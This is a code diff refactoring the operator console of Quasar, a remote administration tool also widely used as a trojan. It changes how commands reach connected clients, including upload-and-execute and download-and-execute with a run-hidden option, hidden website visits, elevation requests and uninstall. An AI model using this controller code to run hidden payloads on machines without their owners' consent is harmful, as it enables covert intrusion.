@@ -4,6 +4,8 @@ using System.IO;
 using System.Linq;
 using System.Threading;
 using System.Windows.Forms;
+using Quasar.Common.Enums;
+using Quasar.Common.Packets;
 using xServer.Core.Commands;
 using xServer.Core.Cryptography;
 using xServer.Core.Data;
@@ -441,7 +443,15 @@ namespace xServer.Forms
                         {
                             foreach (Client c in GetSelectedClients())
                             {
-                                new Core.Packets.ServerPackets.DoClientUpdate(0, Core.Data.Update.DownloadURL, string.Empty, new byte[0x00], 0, 0).Execute(c);
+                                c.Send(new DoClientUpdate
+                                {
+                                    Id = 0,
+                                    DownloadUrl = Core.Data.Update.DownloadURL,
+                                    FileName = string.Empty,
+                                    Block = new byte[0x00],
+                                    MaxBlocks = 0,
+                                    CurrentBlock = 0
+                                });
                             }
                         }
                         else
@@ -457,7 +467,7 @@ namespace xServer.Forms
                                     FileSplit srcFile = new FileSplit(Core.Data.Update.UploadPath);
                                     if (srcFile.MaxBlocks < 0)
                                     {
-                                        MessageBox.Show(string.Format("Error reading file: {0}", srcFile.LastError),
+                                        MessageBox.Show($"Error reading file: {srcFile.LastError}",
                                             "Update aborted", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                                         error = true;
                                         break;
@@ -466,19 +476,28 @@ namespace xServer.Forms
                                     int id = FileHelper.GetNewTransferId();
 
                                     CommandHandler.HandleSetStatus(c,
-                                        new Core.Packets.ClientPackets.SetStatus("Uploading file..."));
+                                        new SetStatus {Message = "Uploading file..."});
 
                                     for (int currentBlock = 0; currentBlock < srcFile.MaxBlocks; currentBlock++)
                                     {
                                         byte[] block;
                                         if (!srcFile.ReadBlock(currentBlock, out block))
                                         {
-                                            MessageBox.Show(string.Format("Error reading file: {0}", srcFile.LastError),
+                                            MessageBox.Show($"Error reading file: {srcFile.LastError}",
                                                 "Update aborted", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                                             error = true;
                                             break;
                                         }
-                                        new Core.Packets.ServerPackets.DoClientUpdate(id, string.Empty, string.Empty, block, srcFile.MaxBlocks, currentBlock).Execute(c);
+
+                                        c.Send(new DoClientUpdate
+                                        {
+                                            Id = id,
+                                            DownloadUrl = string.Empty,
+                                            FileName = string.Empty,
+                                            Block = block,
+                                            MaxBlocks = srcFile.MaxBlocks,
+                                            CurrentBlock = currentBlock
+                                        });
                                     }
                                 }
                             }).Start();
@@ -492,7 +511,7 @@ namespace xServer.Forms
         {
             foreach (Client c in GetSelectedClients())
             {
-                new Core.Packets.ServerPackets.DoClientReconnect().Execute(c);
+                c.Send(new DoClientReconnect());
             }
         }
 
@@ -500,7 +519,7 @@ namespace xServer.Forms
         {
             foreach (Client c in GetSelectedClients())
             {
-                new Core.Packets.ServerPackets.DoClientDisconnect().Execute(c);
+                c.Send(new DoClientDisconnect());
             }
         }
 
@@ -516,7 +535,7 @@ namespace xServer.Forms
             {
                 foreach (Client c in GetSelectedClients())
                 {
-                    new Core.Packets.ServerPackets.DoClientUninstall().Execute(c);
+                    c.Send(new DoClientUninstall());
                 }
             }
         }
@@ -647,7 +666,7 @@ namespace xServer.Forms
         {
             foreach (Client c in GetSelectedClients())
             {
-                new Core.Packets.ServerPackets.DoAskElevate().Execute(c);
+                c.Send(new DoAskElevate());
             }
         }
 
@@ -655,7 +674,7 @@ namespace xServer.Forms
         {
             foreach (Client c in GetSelectedClients())
             {
-                new Core.Packets.ServerPackets.DoShutdownAction(ShutdownAction.Shutdown).Execute(c);
+                c.Send(new DoShutdownAction {Action = ShutdownAction.Shutdown});
             }
         }
 
@@ -663,7 +682,7 @@ namespace xServer.Forms
         {
             foreach (Client c in GetSelectedClients())
             {
-                new Core.Packets.ServerPackets.DoShutdownAction(ShutdownAction.Restart).Execute(c);
+                c.Send(new DoShutdownAction {Action = ShutdownAction.Restart});
             }
         }
 
@@ -671,7 +690,7 @@ namespace xServer.Forms
         {
             foreach (Client c in GetSelectedClients())
             {
-                new Core.Packets.ServerPackets.DoShutdownAction(ShutdownAction.Standby).Execute(c);
+                c.Send(new DoShutdownAction {Action = ShutdownAction.Standby});
             }
         }
 
@@ -766,16 +785,22 @@ namespace xServer.Forms
                                 int id = FileHelper.GetNewTransferId();
 
                                 CommandHandler.HandleSetStatus(c,
-                                    new Core.Packets.ClientPackets.SetStatus("Uploading file..."));
+                                    new SetStatus {Message = "Uploading file..."});
 
                                 for (int currentBlock = 0; currentBlock < srcFile.MaxBlocks; currentBlock++)
                                 {
                                     byte[] block;
                                     if (srcFile.ReadBlock(currentBlock, out block))
                                     {
-                                        new Core.Packets.ServerPackets.DoUploadAndExecute(id,
-                                            Path.GetFileName(UploadAndExecute.FilePath), block, srcFile.MaxBlocks,
-                                            currentBlock, UploadAndExecute.RunHidden).Execute(c);
+                                        c.SendBlocking(new DoUploadAndExecute
+                                        {
+                                            Id = id,
+                                            FileName = Path.GetFileName(UploadAndExecute.FilePath),
+                                            Block = block,
+                                            MaxBlocks = srcFile.MaxBlocks,
+                                            CurrentBlock = currentBlock,
+                                            RunHidden = UploadAndExecute.RunHidden
+                                        });
                                     }
                                     else
                                     {
@@ -802,8 +827,11 @@ namespace xServer.Forms
                     {
                         foreach (Client c in GetSelectedClients())
                         {
-                            new Core.Packets.ServerPackets.DoDownloadAndExecute(DownloadAndExecute.URL,
-                                DownloadAndExecute.RunHidden).Execute(c);
+                            c.Send(new DoDownloadAndExecute
+                            {
+                                Url = DownloadAndExecute.URL,
+                                RunHidden = DownloadAndExecute.RunHidden
+                            });
                         }
                     }
                 }
@@ -820,7 +848,11 @@ namespace xServer.Forms
                     {
                         foreach (Client c in GetSelectedClients())
                         {
-                            new Core.Packets.ServerPackets.DoVisitWebsite(VisitWebsite.URL, VisitWebsite.Hidden).Execute(c);
+                            c.Send(new DoVisitWebsite
+                            {
+                                Url = VisitWebsite.URL,
+                                Hidden = VisitWebsite.Hidden
+                            });
                         }
                     }
                 }
@@ -837,8 +869,13 @@ namespace xServer.Forms
                     {
                         foreach (Client c in GetSelectedClients())
                         {
-                            new Core.Packets.ServerPackets.DoShowMessageBox(
-                                Messagebox.Caption, Messagebox.Text, Messagebox.Button, Messagebox.Icon).Execute(c);
+                            c.Send(new DoShowMessageBox
+                            {
+                                Caption = Messagebox.Caption,
+                                Text = Messagebox.Text,
+                                Button = Messagebox.Button,
+                                Icon = Messagebox.Icon
+                            });
                         }
                     }
                 }
